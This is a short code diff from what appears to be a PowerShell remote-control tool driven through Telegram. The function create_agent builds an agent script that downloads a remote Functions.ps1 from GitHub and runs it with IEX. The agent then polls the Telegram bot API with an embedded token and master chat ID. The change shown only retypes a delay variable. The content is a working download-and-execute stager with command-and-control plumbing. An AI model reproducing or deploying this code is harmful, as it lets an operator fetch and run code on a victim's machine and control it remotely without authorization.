@@ -1,5 +1,5 @@
 function create_agent {param ($botkey,$chat_id)
-$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";Start-Sleep -s $delay';$agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
+$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[string]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";Start-Sleep -s $delay';$agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
 
 
 
